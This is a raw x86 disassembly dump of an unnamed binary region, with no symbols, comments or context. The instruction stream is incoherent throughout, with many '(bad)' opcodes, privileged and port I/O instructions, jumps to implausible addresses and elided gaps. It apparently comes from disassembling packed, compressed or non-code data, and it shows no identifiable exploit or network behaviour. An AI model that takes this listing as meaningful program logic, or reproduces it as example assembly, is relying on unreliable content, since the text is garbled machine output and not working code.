  42f884:	jp     0x42f850
  42f886:	in     al,dx
  42f887:	pusha  
  42f888:	loopne 0x42f816
  42f88a:	add    DWORD PTR [edx+0x0],0x0
	...
  42f8a4:	add    bh,dl
  42f8a6:	add    al,0xe9
  42f8a8:	mov    WORD PTR [esi],?
  42f8aa:	or     DWORD PTR [esi+0x28],esp
  42f8ad:	dec    esp
  42f8ae:	add    al,0xba
  42f8b0:	mov    WORD PTR [esi+0x7f66745c],?
  42f8b6:	push   ebx
  42f8b7:	mov    ds:0xe90839c1,al
  42f8bc:	mov    ah,0x7a
  42f8be:	mov    al,0xc
  42f8c0:	or     al,0xc6
  42f8c2:	jg     0x42f8fc
  42f8c4:	sbb    eax,0x2495fcbe
  42f8c9:	je     0x42f89d
  42f8cb:	in     al,dx
  42f8cc:	add    ecx,eax
  42f8ce:	stc    
  42f8cf:	mov    ecx,0xa37f438c
  42f8d4:	pop    es
  42f8d5:	aas    
  42f8d6:	sbb    BYTE PTR [ecx+0x6c],al
  42f8d9:	int    0x2b
  42f8db:	jmp    0x7352afe3
  42f8e0:	or     ebx,DWORD PTR [edx+0x7ab48a63]
  42f8e6:	inc    edx
  42f8e7:	rol    DWORD PTR [esi],1
  42f8e9:	hlt    
  42f8ea:	add    al,0xe9
  42f8ec:	shr    DWORD PTR [edx+0x7303ed46],0xc8
  42f8f3:	add    al,0x8
  42f8f5:	retf   
  42f8f6:	(bad)
  42f8f9:	in     al,0xba
  42f8fb:	outs   dx,DWORD PTR ds:[esi]
  42f8fc:	ret    0x43fb
  42f8ff:	add    cl,cl
  42f901:	icebp  
  42f902:	mov    ah,0x8c
  42f904:	cmp    ah,ch
  42f906:	pop    esp
  42f907:	mov    ebx,0xcf
	...
  42f920:	add    BYTE PTR [eax],al
  42f922:	test   DWORD PTR [edx+ebx*2],0x5204fbab
  42f929:	bound  esp,QWORD PTR [esi]
  42f92b:	pop    ebp
  42f92c:	and    cl,BYTE PTR [esi+0x2df24e54]
  42f932:	or     al,0xfd
  42f934:	add    ch,dh
  42f936:	std    
  42f937:	mov    dh,0xe7
  42f939:	retf   0x4dc
  42f93c:	add    BYTE PTR [edx+0x2d],ah
  42f93f:	scas   eax,DWORD PTR es:[edi]
  42f940:	mov    ebp,0x86b6f7ed
  42f945:	pop    ecx
  42f946:	js     0x42f8d7
  42f948:	and    al,0xeb
  42f94a:	test   DWORD PTR [eax+eax*1],0xffdcd7d4
  42f951:	lock test DWORD PTR [eax+ebp*8],0x51d46
  42f959:	pusha  
  42f95a:	jge    0x42f985
  42f95c:	(bad)  
  42f95d:	call   0x9d038159
  42f962:	jmp    0x42f94e
  42f964:	pop    es
  42f965:	push   ds
  42f966:	dec    edx
  42f967:	and    dl,BYTE PTR [edx]
  42f969:	test   eax,0xafc022f7
  42f96e:	mov    eax,0xb0a70194
  42f973:	mov    dh,0xfa
  42f975:	jne    0x42f952
  42f977:	add    BYTE PTR [edi+0x23d8cbf9],al
  42f97d:	fisttp QWORD PTR [edi-0x44193347]
  42f983:	and    eax,eax
  42f985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  42f99e:	add    dl,bh
  42f9a0:	or     al,0x87
  42f9a2:	sub    eax,esi
  42f9a4:	jnp    0x42f9e8
  42f9a6:	cmc    
  42f9a7:	jo     0x42f930
  42f9a9:	sbb    al,0x0
  42f9ab:	or     al,0x6
  42f9ad:	add    BYTE PTR [ecx-0x5e2a5],cl
  42f9b3:	fld    QWORD PTR [eax+0x5cf287e]
  42f9b9:	add    BYTE PTR [ebx+0x8bd928b],cl
  42f9bf:	fst    QWORD PTR [edi+0x5575f182]
  42f9c5:	sti    
  42f9c6:	dec    ebp
  42f9c8:	mov    bh,0x43
  42f9ca:	and    al,0xc5
  42f9cc:	or     BYTE PTR [esi+eax*1+0xb],dh
  42f9d0:	loope  0x42f976
  42f9d2:	es popf 
  42f9d4:	add    eax,0xc6f3c683
  42f9d9:	add    eax,DWORD PTR [eax]
  42f9db:	adc    bh,BYTE PTR [ebx+0x24]
  42f9de:	add    bl,BYTE PTR [ebp-0x1af940fb]
  42f9e4:	jge    0x42fa26
  42f9e6:	add    BYTE PTR ds:0x8d001e83,dh
  42f9ec:	jle    0x42f9b4
  42f9ee:	jmp    0x39b993
  42f9f3:	mov    esi,DWORD PTR [edi+0x55a901ba]
  42f9f9:	gs adc al,0xe0
  42f9fc:	mov    DWORD PTR [ecx+eax*1],ebx
  42f9ff:	pop    ebp
  42fa00:	add    eax,0x8b52
	...
  42fa19:	add    BYTE PTR [eax],al
  42fa1b:	add    ah,ch
  42fa1d:	loopne 0x42fa0c
  42fa1f:	mov    ch,0xf3
  42fa21:	mov    cl,0xed
  42fa23:	ret    
  42fa24:	dec    edi
  42fa25:	cmp    DWORD PTR [ebx],esp
  42fa27:	mov    ebx,DWORD PTR [ecx+0x29]
  42fa2a:	or     BYTE PTR [ebp-0x7cf6d323],al
  42fa30:	int    0xfc
  42fa32:	dec    edi
  42fa33:	(bad)  
  42fa34:	retf   0xe34c
  42fa37:	stos   DWORD PTR es:[edi],eax
  42fa38:	push   0xf4ebf6af
  42fa3d:	dec    ebp
  42fa3e:	addr16 daa 
  42fa40:	mov    bl,0x5b
  42fa42:	jmp    DWORD PTR [ebp-0x20]
  42fa45:	(bad)  
  42fa46:	dec    esi
  42fa47:	push   esi
  42fa48:	and    DWORD PTR [edi],0xd1bde7f8
  42fa4e:	pop    esp
  42fa4f:	sti    
  42fa50:	ins    DWORD PTR es:[edi],dx
  42fa51:	mov    edi,0x5edbfe26
  42fa56:	mov    ebp,0xb55df8bd
  42fa5b:	push   edx
  42fa5c:	retf   
  42fa5d:	repnz daa 
  42fa5f:	adc    BYTE PTR [edi+0x6d],ch
  42fa62:	pop    edx
  42fa63:	je     0x42fa75
  42fa65:	cs addr16 mov ebp,0x8759cfc6
  42fa6c:	lods   al,BYTE PTR ds:[esi]
  42fa6d:	loope  0x42fac8
  42fa6f:	jp     0x42fa70
  42fa71:	xlat   BYTE PTR ds:[ebx]
  42fa72:	test   BYTE PTR [eax],ch
  42fa74:	neg    BYTE PTR [ebp-0x1]
  42fa77:	std    
  42fa78:	pop    es
  42fa79:	dec    esp
  42fa7a:	mov    bl,bh
  42fa7c:	add    BYTE PTR [eax-0x7a],ch
  42fa7f:	dec    esp
	...
  42fa98:	add    al,bl
  42fa9a:	xor    DWORD PTR [eax+0x31d2e042],edx
  42faa0:	call   0xfb9fd33b
  42faa5:	jg     0x42fac6
  42faa7:	mov    edx,0xff663659
  42faac:	dec    esi
  42faad:	ret    0xd326
  42fab0:	and    ebp,eax
  42fab2:	rcl    BYTE PTR [ebx-0x5],cl
  42fab5:	rol    BYTE PTR [ecx-0xd],0xfa
  42fab9:	enter  0xf349,0xe7
  42fabd:	fldl2e 
  42fabf:	pop    ecx
  42fac0:	sti    
  42fac1:	jg     0x42fae9
  42fac3:	mov    bh,dl
  42fac5:	stos   BYTE PTR es:[edi],al
  42fac6:	nop
  42fac7:	push   ebp
  42fac8:	or     ah,0x5b
  42facb:	(bad)  
  42facc:	push   esi
  42face:	add    al,0x5d
  42fad0:	xor    BYTE PTR [edi+0xa309b81],ah
  42fad6:	push   eax
  42fad7:	jmp    0x323c315c
  42fadc:	mov    DWORD PTR [esi],esi
  42fade:	pop    ebp
  42fadf:	cli    
  42fae0:	xchg   esi,eax
  42fae1:	out    dx,al
  42fae2:	dec    edi
  42fae3:	cmp    DWORD PTR fs:[eax+0x2],esp
  42fae7:	pop    esi
  42fae8:	rcl    BYTE PTR [edi],1
  42faea:	stc    
  42faeb:	pop    ebp
  42faec:	xor    DWORD PTR [ebx+0x46],esi
  42faef:	xchg   ecx,eax
  42faf0:	mov    eax,0xb59a4e85
  42faf5:	jb     0x42fb3d
  42faf7:	add    DWORD PTR [edi],0xbd8a4e89
	...
  42fb15:	add    BYTE PTR ds:0x71b9a67c,bl
  42fb1b:	add    cl,ch
  42fb1d:	mov    dh,0x72
  42fb1f:	pusha  
  42fb20:	sbb    BYTE PTR [ebx+0xff47c45],dh
  42fb26:	inc    edi
  42fb27:	jl     0x42fb89
  42fb29:	push   esi
  42fb2a:	ja     0x42fb48
  42fb2c:	out    0x3,eax
  42fb2e:	hlt    
  42fb2f:	add    eax,0xff7fdf60
  42fb34:	fs nop
  42fb36:	hlt    
  42fb37:	add    al,0xe9
  42fb39:	xchg   BYTE PTR [esi-0x1],ah
  42fb3c:	push   0xffffff88
  42fb3e:	hlt    
  42fb3f:	add    al,0xe9
  42fb41:	mov    BYTE PTR [edi],dh
  42fb43:	pop    esp
  42fb44:	(bad)  
  42fb45:	pop    ebp
  42fb46:	pop    edi
  42fb47:	dec    edi
  42fb48:	ins    DWORD PTR es:[edi],dx
  42fb49:	inc    esp
  42fb4a:	leave  
  42fb4b:	or     DWORD PTR [esi+0x4c],esp
  42fb4e:	dec    edi
  42fb4f:	pop    ebx
  42fb50:	xchg   esp,eax
  42fb51:	mov    gs,WORD PTR [edi+0x20]
  42fb54:	out    0x3,eax
  42fb56:	hlt    
  42fb57:	sub    DWORD PTR [edx+0x0],0xb2e904f5
  42fb5e:	jl     0x42fb21
  42fb60:	push   eax
  42fb62:	outs   dx,BYTE PTR ds:[esi]
  42fb63:	leave  
  42fb64:	or     eax,DWORD PTR [ecx]
  42fb66:	scas   al,BYTE PTR es:[edi]
  42fb67:	cwde   
  42fb68:	cli    
  42fb69:	out    0x7c,al
  42fb6b:	mov    esp,DWORD PTR [ebx+ebp*8]
  42fb6e:	test   DWORD PTR [eax+edi*4],0x4efe9
  42fb75:	adc    ah,BYTE PTR [eax+0xb94cfb]
	...
  42fb93:	jl     0x42fb5d
  42fb95:	or     ebx,DWORD PTR [edx]
  42fb97:	jge    0x42fb49
  42fb99:	pop    es
  42fb9a:	rcl    DWORD PTR [esi],0x98
  42fb9d:	cli    
  42fb9e:	scas   al,BYTE PTR es:[edi]
  42fb9f:	ins    BYTE PTR es:[edi],dx
  42fba0:	sar    bl,1
  42fba2:	aas    
  42fba3:	xor    DWORD PTR [edx+0x4f7eb24],edx
  42fba9:	xchg   DWORD PTR [esi-0x713187b1],esp
  42fbaf:	sbb    BYTE PTR [ebp+eax*2-0xf],bh
  42fbb3:	or     al,0x43
  42fbb5:	je     0x42fb82
  42fbb7:	dec    eax
  42fbb8:	fdiv   st,st(7)
  42fbba:	bound  edi,QWORD PTR [edx-0x7c041806]
  42fbc0:	dec    ebx
  42fbc1:	sti    
  42fbc2:	push   0xffffffb2
  42fbc4:	push   es
  42fbc5:	add    bh,bl
  42fbc7:	xchg   BYTE PTR [edi+0x4f60dbb],al
  42fbcd:	add    BYTE PTR [edx-0x5e],ah
  42fbd0:	push   es
  42fbd1:	xchg   DWORD PTR [ebx+eax*1-0x368a1ca3],ebp
  42fbd8:	dec    ecx
  42fbd9:	xchg   DWORD PTR [edi+ebp*8-0x5e1f194b],ebp
  42fbe0:	dec    ebx
  42fbe1:	jne    0x42fbd4
  42fbe3:	fild   QWORD PTR [edi-0x5657e133]
  42fbe9:	pop    ecx
  42fbea:	and    BYTE PTR [ebp+0x6cb3fffc],dh
  42fbf0:	popa   
  42fbf1:	jg     0x42fbf3
  42fbf3:	or     esi,edi
  42fbf5:	dec    ebp
  42fbf6:	mov    eax,DWORD PTR [eax]
	...
  42fc10:	mov    al,ds:0x248b4e51
  42fc15:	mov    ecx,0x20f287e
  42fc1a:	add    BYTE PTR [ecx],al
  42fc1c:	test   BYTE PTR [ebx],ch
  42fc1e:	out    dx,eax
  42fc1f:	je     0x42fbd3
  42fc21:	sub    esi,0x7e
  42fc24:	scas   al,BYTE PTR es:[edi]
  42fc25:	jge    0x42fbe6
  42fc27:	call   0x39a88b
  42fc2c:	popa   
  42fc2d:	leave  
  42fc2e:	jae    0x42fc94
  42fc30:	jne    0x42fc3a
  42fc32:	or     BYTE PTR [eax],al
  42fc34:	int    0xee
  42fc36:	out    dx,eax
  42fc37:	lea    edi,[edx]
  42fc39:	sbb    eax,0xfaddfffa
  42fc3e:	dec    esp
  42fc3f:	lock push cs
  42fc41:	jl     0x42fcc2
  42fc43:	sbb    al,0xcc
  42fc45:	add    DWORD PTR [eax],eax
  42fc47:	push   ecx
  42fc48:	push   esp
  42fc49:	cmp    al,0xf7
  42fc4b:	mov    eax,esp
  42fc4d:	pop    eax
  42fc4e:	jecxz  0x42fc64
  42fc50:	loope  0x42fbfc
  42fc52:	test   BYTE PTR [ebx-0x787302f8],0xb1
  42fc59:	pop    es
  42fc5a:	add    BYTE PTR [eax],al
  42fc5c:	push   es
  42fc5d:	icebp  
  42fc5e:	mov    BYTE PTR [ebp+0x15],al
  42fc61:	jle    0x42fca8
  42fc63:	adc    BYTE PTR ds:0x2afeaf38,dh
  42fc69:	stos   BYTE PTR es:[edi],al
  42fc6a:	je     0x42fc68
  42fc6c:	out    0x43,al
  42fc6e:	or     ebp,eax
  42fc70:	pop    ss
  42fc71:	jbe    0x42fc69
  42fc73:	inc    DWORD PTR [eax]
	...
  42fc8d:	(bad)  
  42fc8e:	inc    ebx
  42fc8f:	repz mov edi,DWORD PTR [eax-0x43]
  42fc93:	dec    ebp
  42fc94:	jmp    FWORD PTR ds:0xe50874aa
  42fc9a:	pop    edi
  42fc9b:	int    0xff
  42fc9d:	hlt    
  42fc9e:	idiv   BYTE PTR [edx+0x5695e8e6]
  42fca4:	jne    0x42fca6
  42fca6:	pop    es
  42fca7:	rol    DWORD PTR [edi],1
  42fca9:	sbb    al,0xa1
  42fcab:	xor    eax,0xb97623fb
  42fcb0:	enter  0x2f36,0xff
  42fcb4:	push   esp
  42fcb5:	jg     0x42fcee
  42fcb7:	mov    al,BYTE PTR [ebp-0x4]
  42fcba:	fisub  DWORD PTR [edx+0xc]
  42fcbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fcbe:	or     eax,0xb0ec65af
  42fcc3:	iret   
  42fcc4:	sti    
  42fcc5:	dec    edi
  42fcc6:	ss xchg esp,eax
  42fcc8:	and    eax,0xfb125df4
  42fccd:	pop    ds
  42fcce:	fwait
  42fccf:	rcr    BYTE PTR [esi+0x1d],1
  42fcd2:	sbb    DWORD PTR [eax+0x7a],ebx
  42fcd5:	das    
  42fcd6:	xlat   BYTE PTR ds:[ebx]
  42fcd7:	mov    edi,0x88635e07
  42fcdc:	jne    0x42fc9a
  42fcde:	pop    ss
  42fcdf:	ins    BYTE PTR es:[edi],dx
  42fce0:	cwde   
  42fce1:	adc    DWORD PTR [esi-0x1],ebx
  42fce4:	ss mov ebx,0x3186c349
  42fcea:	push   esi
  42fceb:	in     eax,dx
  42fcec:	or     BYTE PTR [ecx+0x49],dh
  42fcef:	pop    es
  42fcf0:	push   edi
	...
  42fd09:	add    BYTE PTR [esp+eiz*8+0x26f4001f],cl
  42fd10:	aas    
  42fd11:	jne    0x42fce1
  42fd13:	(bad)  
  42fd14:	mov    edi,0x7c1af7fb
  42fd19:	daa    
  42fd1a:	mov    dh,0xe7
  42fd1c:	shr    DWORD PTR ss:[edi-0x29],1
  42fd20:	push   ecx
  42fd21:	or     ebx,DWORD PTR [ebx-0x1700a86f]
  42fd27:	mov    BYTE PTR gs:[edx-0xa],al
  42fd2b:	ins    DWORD PTR es:[edi],dx
  42fd2c:	push   esi
  42fd2d:	jne    0x42fd2f
  42fd2f:	add    eax,0xf2d7f022
  42fd34:	test   al,0x3
  42fd36:	popf   
  42fd37:	lods   eax,DWORD PTR ds:[esi]
  42fd38:	imul   eax,DWORD PTR [ebx-0x40],0xffffffed
  42fd3c:	mov    al,BYTE PTR [eax]
  42fd3e:	adc    eax,0x7d2b6ee7
  42fd44:	pushf  
  42fd45:	push   edi
  42fd46:	(bad)  
  42fd48:	hlt    
  42fd49:	fldcw  WORD PTR [edi+ebx*8]
  42fd4c:	out    dx,eax
  42fd4d:	mov    edx,0x4b3daaae
  42fd52:	dec    edx
  42fd53:	std    
  42fd54:	call   0xe2464361
  42fd59:	xchg   ecx,eax
  42fd5a:	scas   al,BYTE PTR es:[edi]
  42fd5b:	add    eax,0x7fc64a8
  42fd60:	test   al,0x6d
  42fd62:	ror    DWORD PTR [ebx+0x35],cl
  42fd65:	and    al,bh
  42fd67:	pop    esp
  42fd68:	xchg   BYTE PTR ds:0x59a604f4,ah
	...
  42fd86:	add    BYTE PTR [eax+0x21],cl
  42fd89:	in     eax,dx
  42fd8a:	imul   ecx,DWORD PTR [ebp-0x7cfc16d9],0xffffffb1
  42fd91:	pop    ebp
  42fd92:	push   0x8248025
  42fd97:	inc    ebx
  42fd98:	mov    bl,0x19
  42fd9a:	out    dx,al
  42fd9b:	stos   BYTE PTR es:[edi],al
  42fd9c:	scas   al,BYTE PTR es:[edi]
  42fd9d:	lds    eax,FWORD PTR [ebx+eiz*1+0x5d]
  42fda1:	jmp    0xf4ffcb75
  42fda6:	and    eax,0x8cfad13c
  42fdab:	xor    ebp,esi
  42fdad:	arpl   WORD PTR [edi+ebp*8-0x80],ax
  42fdb1:	jmp    0x2247f1b8
  42fdb6:	add    al,0xc7
  42fdb8:	add    al,0xe9
  42fdba:	add    ebx,DWORD PTR [ebp+0x51]
  42fdbd:	jmp    0x86f1c5
  42fdc2:	lods   al,BYTE PTR ds:[esi]
  42fdc3:	ret    
  42fdc4:	add    al,0x0
  42fdc6:	jmp    0x2e536182
  42fdcb:	mov    ecx,DWORD PTR [edi+0x0]
  42fdce:	jmp    0xef29c2ca
  42fdd3:	mov    ah,0xc1
  42fdd5:	sti    
  42fdd6:	jmp    0x72c302d2
  42fddb:	imul   edi,edi,0xffffffb5
  42fdde:	jmp    0xca4302d7
  42fde3:	mov    cl,0x8d
  42fde5:	add    ch,ah
  42fde7:	test   DWORD PTR [edi+esi*1],0xa8
	...
  42fe02:	add    BYTE PTR [eax],al
  42fe04:	sub    al,0x27
  42fe06:	je     0x42fe1e
  42fe08:	add    DWORD PTR [esp+esi*2+0x1a],0xffffffe3
  42fe0d:	add    al,0x1
  42fe0f:	jmp    0x450cf0b
  42fe14:	lock dec edx
  42fe16:	sti    
  42fe17:	jmp    0xe9800dcf
  42fe1c:	lock add al,0x0
  42fe1f:	xor    al,0x99
  42fe21:	jecxz  0x42fe20
  42fe23:	xchg   ecx,eax
  42fe24:	icebp  
  42fe25:	loop   0x42fe2a
  42fe27:	inc    edx
  42fe28:	push   ecx
  42fe29:	lock cmp al,0xe9
  42fe2c:	mov    edx,0x115fb4a
  42fe31:	or     BYTE PTR [eax],al
  42fe33:	out    dx,eax
  42fe34:	test   DWORD PTR [esp+esi*2],0x758b00c8
  42fe3b:	popa   
  42fe3c:	add    BYTE PTR [edx],dh
  42fe3e:	aas    
  42fe3f:	add    eax,DWORD PTR [eax]
  42fe41:	scas   al,BYTE PTR es:[edi]
  42fe42:	push   edx
  42fe43:	push   ecx
  42fe44:	sub    ebx,ebp
  42fe46:	(bad)  
  42fe47:	call   0x5fc853bc
  42fe4c:	stos   BYTE PTR es:[edi],al
  42fe4d:	inc    DWORD PTR [esi-0x3f7e985c]
  42fe53:	add    BYTE PTR [ecx-0x39c777d8],ch
  42fe59:	xor    esp,DWORD PTR [ebp+0x5]
  42fe5c:	mov    dh,0xb7
  42fe5e:	popa   
  42fe5f:	add    al,0xb5
  42fe61:	or     ebx,DWORD PTR [edx]
  42fe63:	add    BYTE PTR [ebp-0x35],bl
  42fe66:	mov    edi,0x74
	...
  42fe7f:	add    BYTE PTR [eax],al
  42fe81:	pop    eax
  42fe82:	or     DWORD PTR [eax],0x2afff6ff
  42fe88:	rcl    BYTE PTR [esi+0x4c10742],0x1
  42fe8f:	and    cl,0xc
  42fe92:	jg     0x42fe92
  42fe94:	xchg   DWORD PTR [ebx+0x4a],edx
  42fe97:	test   al,al
  42fe99:	mov    al,bh
  42fe9b:	add    BYTE PTR [ebp+0xd],0x85
  42fe9f:	shl    BYTE PTR [esp+ecx*8+0x77],0x38
  42fea4:	jmp    0x42fe86
  42fea6:	pop    eax
  42fea7:	jnp    0x42fea9
  42fea9:	fld    QWORD PTR ds:0xb2de6a4b
  42feaf:	je     0x42fead
  42feb1:	mov    ds:0x13e80333,al
  42feb6:	(bad)  
  42feb7:	cmc    
  42feb8:	call   FWORD PTR [ecx-0x3f]
  42febb:	jae    0x42fec1
  42febd:	inc    esi
  42febe:	or     esp,ebx
  42fec0:	sub    eax,DWORD PTR [esi+0x2c]
  42fec3:	or     eax,DWORD PTR [ebp-0xfccb9e]
  42fec9:	test   al,0x1
  42fecb:	or     eax,DWORD PTR [eax-0x63]
  42fece:	js     0x42fecf
  42fed0:	mov    ah,BYTE PTR [ebx-0x7c]
  42fed3:	div    DWORD PTR [eax+edx*4+0x7e]
  42fed7:	mov    edi,0xf5c6aae8
  42fedc:	dec    DWORD PTR [edx-0x23]
  42fedf:	cwde   
  42fee0:	and    cl,BYTE PTR [ebp+0xe84e05]
	...
  42fefe:	hlt    
  42feff:	into   
  42ff00:	sbb    eax,0x4bdef400
  42ff05:	sti    
  42ff06:	retf   
  42ff07:	mov    eax,ds:0x5736c8b6
  42ff0c:	inc    DWORD PTR [esp+esi*1+0x4c7f1287]
  42ff13:	sbb    dl,al
  42ff15:	xor    eax,0x41b9f77
  42ff1a:	hlt    
  42ff1b:	outs   dx,DWORD PTR ds:[esi]
  42ff1c:	push   cs
  42ff1d:	jg     0x42fed7
  42ff1f:	aaa    
  42ff20:	pop    es
  42ff21:	add    BYTE PTR [edi+0x5b],bh
  42ff24:	fadd   DWORD PTR ds:0x15526a9e
  42ff2a:	call   0xf42be5c
  42ff2f:	sub    eax,0x63d87452
  42ff34:	push   edx
  42ff35:	je     0x42ff07
  42ff37:	push   ebx
  42ff38:	scas   eax,DWORD PTR es:[edi]
  42ff39:	out    0x25,eax
  42ff3b:	sahf   
  42ff3c:	push   ebp
  42ff3d:	sti    
  42ff3e:	jno    0x42fedb
  42ff40:	fcom   QWORD PTR [esi]
  42ff42:	jns    0x42ff74
  42ff44:	retf   
  42ff45:	adc    ebp,ebx
  42ff47:	sub    DWORD PTR [ebx],eax
  42ff49:	sysenter 
  42ff4b:	pop    esi
  42ff4c:	mov    WORD PTR [edx],es
  42ff4e:	iret   
  42ff4f:	fs xor dl,0x48
  42ff53:	pusha  
  42ff54:	cmp    al,BYTE PTR [edx]
  42ff56:	and    ebx,DWORD PTR [esi-0x1]
  42ff59:	push   DWORD PTR [edi-0x6a]
  42ff5c:	push   edx
  42ff5d:	mov    esi,0x86b05dec
	...
  42ff7a:	add    BYTE PTR [eax-0x5b7955f5],ah
  42ff80:	mov    esi,DWORD PTR [esi]
  42ff82:	aaa    
  42ff83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff84:	push   edx
  42ff85:	(bad)  
  42ff86:	jle    0x42ff22
  42ff88:	iret   
  42ff89:	retf   0xcd41
  42ff8c:	clc    
  42ff8d:	or     esi,DWORD PTR [ebp+esi*1+0x5]
  42ff91:	and    DWORD PTR [esi-0x75122f09],esi
  42ff97:	neg    dl
  42ff99:	out    0xb2,al
  42ff9b:	ret    0xc05c
  42ff9e:	inc    edx
  42ff9f:	outs   dx,BYTE PTR ds:[esi]
  42ffa0:	dec    eax
  42ffa1:	outs   dx,BYTE PTR ds:[esi]
  42ffa2:	or     eax,0xba479b3
  42ffa7:	les    ebp,FWORD PTR [edi+0x47fbd031]
  42ffad:	repz push esi
  42ffaf:	loope  0x42ff69
  42ffb1:	test   bl,0x43
  42ffb4:	sub    DWORD PTR [ecx],0x940df0cf
  42ffba:	or     ebp,DWORD PTR [eax-0x2fa20b]
  42ffc0:	or     esi,esi
  42ffc2:	into   
  42ffc3:	or     cl,BYTE PTR [eax-0x2c]
  42ffc6:	pop    es
  42ffc7:	jmp    0x42ff8d
  42ffc9:	call   0xd89ef65a
  42ffce:	mov    dh,BYTE PTR [edi]
  42ffd0:	pop    esp
  42ffd1:	stc    
  42ffd2:	mov    BYTE PTR [ecx-0x7fbee208],bh
  42ffd8:	(bad)  
  42ffd9:	test   eax,0xe9054704
  42ffde:	add    eax,DWORD PTR [eax]
	...
  42fff8:	imul   edi,DWORD PTR ds:0xaa4ab6c2,0xffffffa6
  42ffff:	or     al,0xf4
  430001:	mov    cl,0x5d
  430003:	push   0x8912b625
  430008:	lds    eax,FWORD PTR [ecx-0x7bd12f65]
  43000e:	fwait
  43000f:	push   ebp
  430010:	inc    eax
  430011:	mov    ebx,0xd0f46c65
  430016:	clc    
  430017:	retf   
  430018:	daa    
  430019:	std    
  43001a:	xor    bh,cl
  43001c:	(bad)  
  43001e:	out    0xbb,al
  430020:	xchg   edx,eax
  430021:	(bad)  
  430022:	(bad)  
  430023:	mov    ecx,0xebe6c537
  430028:	in     al,0x44
  43002a:	push   eax
  43002b:	jb     0x430070
  43002d:	call   FWORD PTR [eax+0x27e47bb]
  430033:	inc    ecx
  430034:	fadd   QWORD PTR [esi+0x44744efa]
  43003a:	je     0x430016
  43003c:	enter  0x8d12,0xb4
  430040:	mov    edi,0xaa2b9c5c
  430045:	dec    ebx
  430046:	test   BYTE PTR [ecx],ch
  430048:	and    al,0x0
  43004a:	xchg   DWORD PTR [edi+ebx*4-0x5e9be8a1],ebp
  430051:	rcl    BYTE PTR [ebx],1
  430053:	push   ss
  430054:	and    edi,ebx
  430056:	push   cs
  430057:	test   eax,0x12037df7
	...
  430074:	add    dh,ch
  430076:	cmp    ebx,0x3421975
  43007c:	sahf   
  43007d:	test   DWORD PTR [eax+eax*1],0x5a4bb86a
  430084:	mov    al,0xb5
  430086:	add    BYTE PTR [eax],al
  430088:	fs test eax,0x496a1ed0
  43008e:	dec    edx
  43008f:	je     0x430080
  430091:	cwde   
  430092:	jg     0x4300ce
  430094:	ins    BYTE PTR es:[edi],dx
  430095:	dec    eax
  430096:	ror    DWORD PTR [edx+esi*2],1
  430099:	sbb    BYTE PTR [ebp-0x44],bl
  43009c:	test   al,0x29
  43009e:	dec    edx
  43009f:	push   ebx
  4300a0:	shl    ecx,0x23
  4300a3:	add    cl,ch
  4300a5:	xchg   ecx,eax
  4300a6:	pop    esi
  4300a7:	cmp    al,cl
  4300a9:	test   DWORD PTR [edi+ebp*1],0x858768a9
  4300b0:	test   eax,0xc304bb
  4300b5:	lea    ebx,[ecx-0x7a720005]
  4300bb:	enter  0x5eff,0x97
  4300bf:	sub    ah,0x1c
  4300c2:	fiadd  WORD PTR [edi]
  4300c4:	add    cl,BYTE PTR [ebp-0x6774b0fe]
  4300ca:	dec    edx
  4300cb:	mov    WORD PTR [ebp-0x9513b],es
  4300d1:	lods   eax,DWORD PTR ds:[esi]
  4300d2:	jge    0x430119
  4300d4:	or     ch,al
  4300d6:	icebp  
  4300d7:	stc    
  4300d8:	inc    DWORD PTR [eax]
	...
  4300f2:	dec    ebp
  4300f3:	xchg   ecx,eax
  4300f4:	jg     0x4300b6
  4300f6:	xchg   ecx,eax
  4300f7:	push   esi
  4300f8:	div    BYTE PTR [ebp+0x21]
  4300fb:	jg     0x430082
  4300fd:	clc    
  4300fe:	sbb    BYTE PTR [ecx-0x19f000a],dh
  430104:	dec    edi
  430105:	call   0x39b050
  43010a:	aam    0xc4
  43010c:	add    BYTE PTR [ebp+0x41],0xc7
  430110:	mov    edi,0x91374
  430115:	push   edi
  430116:	sbb    eax,0xd5830002
  43011b:	mov    al,0xc8
  43011d:	ret    
  43011e:	xchg   BYTE PTR [edi+ebx*1],bh
  430121:	add    al,0xc3
  430123:	mov    cl,0x73
  430125:	and    al,0xed
  430127:	(bad)  
  430128:	jae    0x43014e
  43012a:	in     eax,0xb2
  43012c:	jae    0x430152
  43012e:	mov    ebp,0x9afe3fa9
  430133:	mov    cl,0x55
  430135:	ret    
  430136:	push   esi
  430137:	cmp    eax,0xb1e2041f
  43013c:	jae    0x430162
  43013e:	rol    esi,0x7b
  430141:	and    al,0xc1
  430143:	mov    dl,0x73
  430145:	and    al,0xf4
  430147:	dec    ebx
  430148:	push   edi
  430149:	ja     0x4300f5
  43014b:	jbe    0x43019c
  43014d:	pop    ebx
  43014e:	mov    bh,0xd2
  430150:	(bad)  
  430151:	and    ebp,esp
  430153:	in     eax,dx
  430154:	jp     0x4301ca
	...
  43016e:	add    al,bl
  430170:	arpl   WORD PTR [edi+0x42],dx
  430173:	mov    edx,esi
  430175:	dec    esi
  430176:	pop    edx
  430177:	mov    bh,0xd2
  430179:	(bad)  
  43017a:	and    ebp,eax
  43017c:	sar    BYTE PTR [edi+0x4e86f823],cl
  430182:	je     0x430194
  430184:	sub    BYTE PTR [edx+0x7c],bh
  430187:	sbb    BYTE PTR [edi+edx*2-0x3f],ah
  43018b:	pop    edx
  43018c:	push   es
  43018d:	dec    edi
  43018e:	pop    ebx
  43018f:	aaa    
  430190:	push   0x775ec7a
  430195:	cld    
  430196:	std    
  430197:	inc    ebx
  430198:	pop    ebx
  430199:	mov    dh,0x86
  43019b:	mov    ecx,0x2c85804b
  4301a0:	lock dec esi
  4301a2:	sti    
  4301a3:	(bad)
  4301a7:	or     al,0xac
  4301a9:	add    al,0x0
  4301ab:	hlt    
  4301ac:	add    ax,0xff88
  4301b0:	daa    
  4301b1:	add    BYTE PTR [ebp-0x4b1a7f4],0xa4
  4301b8:	xor    eax,DWORD PTR [eax-0x3c]
  4301bb:	cli    
  4301bc:	and    eax,0x3268c083
  4301c1:	adc    al,al
  4301c3:	mov    ebp,0xe3c8826f
  4301c8:	jne    0x43020c
  4301ca:	push   ebp
  4301cb:	outs   dx,DWORD PTR ds:[esi]
  4301cc:	push   edx
  4301cd:	test   ah,ch
  4301cf:	in     al,0x2f
  4301d1:	(bad)  
  4301d2:	inc    DWORD PTR [eax]
	...
  4301ec:	daa    
  4301ed:	sbb    al,0xb7
